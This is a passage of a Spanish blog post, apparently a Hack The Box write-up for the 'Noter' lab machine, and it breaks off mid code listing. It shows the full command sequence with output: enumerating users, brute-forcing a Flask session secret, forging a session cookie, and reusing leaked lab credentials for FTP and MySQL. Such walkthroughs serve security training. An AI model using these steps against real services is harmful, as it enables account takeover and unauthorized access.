<!DOCTYPE html><html lang="es-ES" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="WriteUp Noter HTB" /><meta name="author" content="rabb1t" /><meta property="og:locale" content="es_ES" /><meta name="description" content="Índice Información básica de la máquina Herramientas y recursos empleados Fase de enumeración Enumerando usuarios ¿Tienes algún secreto? Accediendo a ftp como blue Accediendo a ftp como ftp_admin ¿Hay algo o alguien aquí? Escalando privilegios Máquina Noter" /><meta property="og:description" content="Índice Información básica de la máquina Herramientas y recursos empleados Fase de enumeración Enumerando usuarios ¿Tienes algún secreto? Accediendo a ftp como blue Accediendo a ftp como ftp_admin ¿Hay algo o alguien aquí? Escalando privilegios Máquina Noter" /><link rel="canonical" href="https://rabb1t-0.github.io/posts/WriteUp-Noter-HTB/" /><meta property="og:url" content="https://rabb1t-0.github.io/posts/WriteUp-Noter-HTB/" /><meta property="og:site_name" content="rabb1t" /><meta property="og:image" content="https://www.hackthebox.com/storage/avatars/ea85ecc8e550a6997195e9a75a12ca73.png" /><meta property="og:image:height" content="180" /><meta property="og:image:width" content="180" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-02T00:00:00-05:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://www.hackthebox.com/storage/avatars/ea85ecc8e550a6997195e9a75a12ca73.png" /><meta property="twitter:title" content="WriteUp Noter HTB" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"rabb1t"},"dateModified":"2024-08-03T17:28:44-05:00","datePublished":"2022-09-02T00:00:00-05:00","description":"Índice Información básica de la máquina Herramientas y recursos empleados Fase de enumeración Enumerando usuarios ¿Tienes algún secreto? Accediendo a ftp como blue Accediendo a ftp como ftp_admin ¿Hay algo o alguien aquí? Escalando privilegios Máquina Noter","headline":"WriteUp Noter HTB","image":{"width":180,"height":180,"url":"https://www.hackthebox.com/storage/avatars/ea85ecc8e550a6997195e9a75a12ca73.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rabb1t-0.github.io/posts/WriteUp-Noter-HTB/"},"url":"https://rabb1t-0.github.io/posts/WriteUp-Noter-HTB/"}</script><title>WriteUp Noter HTB | rabb1t</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon/rbit.jpg"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon/rbit.jpg"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon/rbit.jpg"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/favicon/rbit.ico"><meta name="apple-mobile-web-app-title" content="rabb1t"><meta name="application-name" content="rabb1t"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto glitch"><div class="glitch__item"></div><div class="glitch__item"></div><div class="glitch__item"></div><div class="glitch__item"></div><div class="glitch__item"></div></a></div><div class="site-title mt-3"> <a href="/">rabb1t</a></div><div class="site-subtitle font-italic">Blog personal, CTFS, artículos de ciberseguridad y más.</div></div><ul class="w-100"><li class="nav-item"> <a href="/blog" class="nav-link cybr-btn"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> INICIO <span class='cybr-btn__glitch' aria-hidden=''>INICIO</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link cybr-btn"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> CATEGORÍAS <span aria-hidden class="cybr-btn__glitch">CATEGORÍAS </span> </a><li class="nav-item"> <a href="/tags/" class="nav-link cybr-btn"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> ETIQUETAS <span aria-hidden class="cybr-btn__glitch">ETIQUETAS </span> </a><li class="nav-item"> <a href="/archives/" class="nav-link cybr-btn"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> ARCHIVO <span aria-hidden class="cybr-btn__glitch">ARCHIVO </span> </a><li class="nav-item"> <a href="/about/" class="nav-link cybr-btn"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> ACERCA DE <span aria-hidden class="cybr-btn__glitch">ACERCA DE </span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/rabb1t-0 " aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.linkedin.com/in/rabb1t" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/blog"> Inicio </a> </span> <span>WriteUp Noter HTB</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Entrada</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Buscar..."> </span> <span id="search-cancel" >Cancelar</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 180 180'%3E%3C/svg%3E" data-src="https://www.hackthebox.com/storage/avatars/ea85ecc8e550a6997195e9a75a12ca73.png" class="preview-img bg" alt="Preview Image" width="180" height="180" data-proofer-ignore><h1 data-toc-skip>WriteUp Noter HTB</h1><div class="post-meta text-muted"><div> Por <em> rabb1t </em></div><div class="d-flex"><div> <span> Publicado <em class="timeago" data-ts="1662094800" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-09-02 </em> </span> <span> Actualizado <em class="timeago" data-ts="1722724124" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2024-08-03 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1809 palabras"> <em>10 min</em> de lectura</span></div></div></div><div class="post-content"><h2 id="índice"><span class="mr-2">Índice</span><a href="#índice" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><a href="#máquina-noter">Información básica de la máquina</a><li><a href="#herramientas-y-recursos-empleados">Herramientas y recursos empleados</a><li><a href="#fase-de-enumeración">Fase de enumeración</a><ul><li><a href="#enumerando-usuarios">Enumerando usuarios</a></ul><li><a href="#tienes-algún-secreto">¿Tienes algún secreto?</a><li><a href="#accediendo-a-ftp-como-blue">Accediendo a ftp como blue</a><li><a href="#accediendo-a-ftp-como-ftp_admin">Accediendo a ftp como ftp_admin</a><li><a href="#hay-algo-o-alguien-aquí">¿Hay algo o alguien aquí?</a><li><a href="#escalando-privilegios">Escalando privilegios</a><h2 id="máquina-noter"><span class="mr-2">Máquina Noter</span><a href="#máquina-noter" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></ul><div class="table-wrapper"><table><thead><tr><th>IP<th>10.10.11.160<tbody><tr><td>OS<td>Linux<tr><td>Dificultad<td>Media<tr><td>Creador<td>kavigihan</table></div><h2 id="herramientas-y-recursos-empleados"><span class="mr-2">Herramientas y recursos empleados</span><a href="#herramientas-y-recursos-empleados" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li>Herramientas<ul><li>nmap<li>wfuzz<li>flask-unsign<li>ftp<li>netcat</ul><li>Recursos<ul><li>hacktricks<li>SecLists</ul></ul><h2 id="fase-de-enumeración"><span class="mr-2">Fase de enumeración</span><a href="#fase-de-enumeración" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Iniciamos con un escaneo de todos los puertos abiertos y la detección de servicios para los mismos:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>❯ nmap <span class="nt">-sCV</span> <span class="nt">-oN</span> scope.txt 10.10.11.160
Nmap scan report <span class="k">for </span>10.10.11.160
Not shown: 997 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d <span class="o">(</span>RSA<span class="o">)</span>
|   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 <span class="o">(</span>ED25519<span class="o">)</span>
5000/tcp open  http    Werkzeug httpd 2.0.2 <span class="o">(</span>Python 3.8.10<span class="o">)</span>
|_http-title: Noter
Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
</pre></table></code></div></div><p>Tenemos el puerto 21 (ftp), 22 (SSH) y 5000 (http), al parecer usando python con <code class="language-plaintext highlighter-rouge">Werkzeug</code>. Intentemos conectarnos a través de <code class="language-plaintext highlighter-rouge">ftp</code> como <code class="language-plaintext highlighter-rouge">anonymous</code> con una contraseña vacía:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>❯ ftp 10.10.11.160
Connected to 10.10.11.160.
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>10.10.11.160:<span class="si">$(</span>USER<span class="si">)</span><span class="o">)</span>: anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed.
</pre></table></code></div></div><p>No podemos acceder, necesitamos credenciales. Tampoco tenemos credenciales para conectarnos por SSH, así que de momento lo dejamos y vamos a por el siguiente servicio, el puerto 5000.</p><p>Vamos a nuestro navegador favorito y ponemos <code class="language-plaintext highlighter-rouge">http://10.10.11.160:5000</code> para realizar la búsqueda. Observamos lo siguiente:</p><p><img data-src="/assets/favicon/2022-09-03/noter1.png" alt="Web Noter" data-proofer-ignore></p><p>Es una web para guardar notas. Podemos intentar credenciales por defecto en <code class="language-plaintext highlighter-rouge">Login</code> como:</p><ul><li>admin:admin<li>administrator:administrator<li>guest:guest</ul><p>Sin embargo, ninguna funciona. Así que vamos a registrarnos para tener un poco más de alcance: <img data-src="/assets/favicon/2022-09-03/noter2.png" alt="Login Web Noter" data-proofer-ignore></p><p>Bueno, vemos que podemos hacer varias cosas, entre ellas: ver nuestras notas y comprar una membresía VIP. También vemos algo interesante: el usuario con el cual ingresamos, se refleja en el dashboard, por lo que podríamos pensar en <code class="language-plaintext highlighter-rouge">SSTI</code> —ya os digo que no sucede nada si hacemos pruebas en el usuario, en el título de las notas ni en el cuerpo de las notas—. Inspeccionando un poco más, nos encontramos algo con lo que podemos jugar: un <strong>JWT (Json Web Token)</strong> guardado en las cookies de nuestra sesión: <img data-src="/assets/favicon/2022-09-03/noter3.png" alt="JWT Web Noter" data-proofer-ignore></p><blockquote><p>eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdDEyMyJ9.YxEeSg.4OIleiyuMjzHlWq0byrDImDLaqU</p></blockquote><p>Veamos qué contiene al pasarlo a esta <a href="https://jwt.io/">web</a> o también podemos decodear la primer parte del Token desde consola:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>❯ <span class="nb">echo</span> <span class="s1">'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdDEyMyJ9'</span> | <span class="nb">base64</span> <span class="nt">-d</span> | jq

<span class="o">{</span>
  <span class="s2">"logged_in"</span>: <span class="nb">true</span>,
  <span class="s2">"username"</span>: <span class="s2">"test123"</span>
<span class="o">}</span>
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>En la web tenemos más datos como el tipo de cifrado <code class="language-plaintext highlighter-rouge">HMACSHA256</code></p></div></blockquote><h2 id="enumerando-usuarios"><span class="mr-2">Enumerando usuarios</span><a href="#enumerando-usuarios" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Anteriormente en el intento de acceder usando credenciales por defecto, vimos el mensaje de error <code class="language-plaintext highlighter-rouge">Invalid credentials</code>. Cuando usamos el usuario que registramos (<code class="language-plaintext highlighter-rouge">test123</code>) con una contraseña errónea, aparece el mensaje <code class="language-plaintext highlighter-rouge">Ìnvalid login</code>, así que tenemos una vía potencial de enumerar usuarios. Denodo a lo anterior usaré <code class="language-plaintext highlighter-rouge">wfuzz</code> —también podríamos crear un script en python para el mismo fin—:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>❯ wfuzz <span class="nt">-c</span> <span class="nt">--ss</span> <span class="s1">'Invalid login'</span> <span class="nt">-w</span> /usr/share/SecLists/Usernames/Names/names.txt <span class="nt">-d</span> <span class="s1">'username=FUZZ&amp;password=admin'</span> <span class="nt">-H</span> <span class="s1">'Content-Type: application/x-www-form-urlencoded'</span> http://10.10.11.160:5000/login
<span class="k">********************************************************</span>
<span class="k">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class="k">*</span>
<span class="k">********************************************************</span>

Target: http://10.10.11.160:5000/login
Total requests: 10177

<span class="o">=====================================================================</span>
ID           Response   Lines    Word       Chars       Payload                                   
<span class="o">=====================================================================</span>

000001208:   200        68 L     110 W      2027 Ch     <span class="s2">"blue"</span> 
</pre></table></code></div></div><ul><li>-c: salida con colores<li>--ss: show regex<li>-w: diccionario<li>-d: datos<li>-H: cabecera</ul><h2 id="tienes-algún-secreto"><span class="mr-2">¿Tienes algún secreto?</span><a href="#tienes-algún-secreto" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>El formato de datos lo podemos ver en la petición que mandamos al intentar ingresar con un usuario y contraseña desde el navegador. Lo importante: obtuvimos un usuario, <code class="language-plaintext highlighter-rouge">blue</code> ¿Y ahora qué? Bueno, haciendo una búsqueda por internet o más bien en la “Biblia”, <a href="https://book.hacktricks.xyz">hacktricks</a>, nos encontramos con algo que nos puede ayudar a <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask">crackear</a> el <code class="language-plaintext highlighter-rouge">secreto</code> del <code class="language-plaintext highlighter-rouge">JWT</code>:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>❯ flask-unsign <span class="nt">--wordlist</span> /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt <span class="nt">--unsign</span> <span class="nt">--cookie</span> <span class="s1">'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdDEyMyJ9.YxEeSg.4OIleiyuMjzHlWq0byrDImDLaqU'</span> <span class="nt">--no-literal-eval</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Session decodes to: <span class="o">{</span><span class="s1">'logged_in'</span>: True, <span class="s1">'username'</span>: <span class="s1">'test123'</span><span class="o">}</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting brute-forcer with 8 threads..
<span class="o">[</span>+] Found secret key after 18048 attempts
b<span class="s1">'secret123'</span>
</pre></table></code></div></div><p>Ahora que tenemos el secreto <code class="language-plaintext highlighter-rouge">secret123</code>, podemos construir nuestro propio <code class="language-plaintext highlighter-rouge">JWT</code> para conectarnos con el usuario <code class="language-plaintext highlighter-rouge">blue</code>:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>❯ flask-unsign <span class="nt">--sign</span> <span class="nt">--cookie</span> <span class="s2">"{'logged_in': True, 'username': 'blue'}"</span> <span class="nt">--secret</span> <span class="s1">'secret123'</span>
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YxEq4Q.mqsQtRYlhrqrq2hkn604WPY2PLY
</pre></table></code></div></div><p>Cambiamos en el navegador la cookie que teníamos por la que hemos construido y accedemos. Al entrar a la sesión vemos que tiene <code class="language-plaintext highlighter-rouge">VIP</code> —con un usuario normal no la teníamos—. Además, observamos que hay dos notas, y una de ellas es ‘Noter Premium Membership’ en la que encontramos lo siguiente:</p><blockquote><p>Written by ftp_admin on Mon Dec 20 01:52:32 2021 Hello, Thank you for choosing our premium service. Now you are capable of doing many more things with our application. All the information you are going to need are on the Email we sent you. By the way, now you can access our FTP service as well. Your username is ‘blue’ and the password is ‘blue@Noter!’. Make sure to remember them and delete this.<br /> (Additional information are included in the attachments we sent along the Email)<br /> We all hope you enjoy our service. Thanks!<br /> ftp_admin</p></blockquote><h2 id="accediendo-a-ftp-como-blue"><span class="mr-2">Accediendo a ftp como blue</span><a href="#accediendo-a-ftp-como-blue" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>¡Ahora tenemos credenciales para acceder por ftp! Cuando accedemos obtenemos lo siguiente:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>❯ ftp 10.10.11.160 
Connected to 10.10.11.160.
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>10.10.11.160:<span class="si">$(</span>USER<span class="si">)</span><span class="o">)</span>: blue
331 Please specify the password.
Password: 
230 Login successful.
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt; <span class="nb">ls</span> <span class="nt">-la</span>
200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        1002         4096 May 02 23:05 <span class="nb">.</span>
drwxr-xr-x    3 0        1002         4096 May 02 23:05 ..
drwxr-xr-x    2 1002     1002         4096 May 02 23:05 files
<span class="nt">-rw-r--r--</span>    1 1002     1002        12569 Dec 24  2021 policy.pdf
ftp&gt;
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>El archivo PDF nos dice la política que se emplea para las contraseñas <code class="language-plaintext highlighter-rouge">username@site_name!</code>.</p></div></blockquote><h2 id="accediendo-a-ftp-como-ftp_admin"><span class="mr-2">Accediendo a ftp como ftp_admin</span><a href="#accediendo-a-ftp-como-ftp_admin" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Sabiendo lo anterior, podemos intentar acceder como el usuario <code class="language-plaintext highlighter-rouge">admin</code> siguiendo la política:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>❯ ftp 10.10.11.160
Connected to 10.10.11.160.
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>10.10.11.160:rabb1t0xf<span class="o">)</span>: ftp_admin
331 Please specify the password.
Password: 
230 Login successful.
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt; <span class="nb">ls</span> <span class="nt">-la</span>
200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        1003         4096 May 02 23:05 <span class="nb">.</span>
drwxr-xr-x    2 0        1003         4096 May 02 23:05 ..
<span class="nt">-rw-r--r--</span>    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip
<span class="nt">-rw-r--r--</span>    1 1003     1003        26298 Dec 01  2021 app_backup_1638395546.zip
226 Directory send OK.
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>contraseña: <code class="language-plaintext highlighter-rouge">ftp_admin@Noter!</code></p></div></blockquote><p>¡Obtuvimos acceso! Además hay dos backups. Sin rechistar los descargamos:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>ftp&gt; get app_backup_1635803546.zip app1.zip
200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Opening BINARY mode data connection <span class="k">for </span>app_backup_1635803546.zip <span class="o">(</span>25559 bytes<span class="o">)</span><span class="nb">.</span>
226 Transfer complete.
25559 bytes received <span class="k">in </span>0,286 seconds <span class="o">(</span>87,3 kbytes/s<span class="o">)</span>
ftp&gt; get app_backup_1638395546.zip app2.zip
200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Opening BINARY mode data connection <span class="k">for </span>app_backup_1638395546.zip <span class="o">(</span>26298 bytes<span class="o">)</span><span class="nb">.</span>
226 Transfer complete.
26298 bytes received <span class="k">in </span>0,28 seconds <span class="o">(</span>91,9 kbytes/s<span class="o">)</span>
ftp&gt; quit
221 Goodbye.
</pre></table></code></div></div><h2 id="hay-algo-o-alguien-aquí"><span class="mr-2">¿Hay algo o alguien aquí?</span><a href="#hay-algo-o-alguien-aquí" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Revisando los archivos, nos encontramos con credenciales para la base de datos MySQL:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'MYSQL_USER'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'root'</span>
<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'MYSQL_PASSWORD'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'Nildogg36'</span>
</pre></table></code></div></div><p>Como no tenemos acceso al sistema, debemos pensar en meternos… Dentro de uno de los archivos <code class="language-plaintext highlighter-rouge">app.py</code> vemos dos funciones que están usando el ejecutable <code class="language-plaintext highlighter-rouge">/bin/bash</code>:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">export_note_local</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
	<span class="k">if</span> <span class="n">check_VIP</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">]):</span>
		<span class="n">cur</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
 
        <span class="n">result</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"SELECT * FROM notes WHERE id = %s and author = %s"</span><span class="p">,</span> <span class="p">(</span><span class="nb">id</span><span class="p">,</span><span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">]))</span>
 
        <span class="k">if</span> <span class="n">result</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
	        <span class="n">note</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="n">fetchone</span><span class="p">()</span>
 
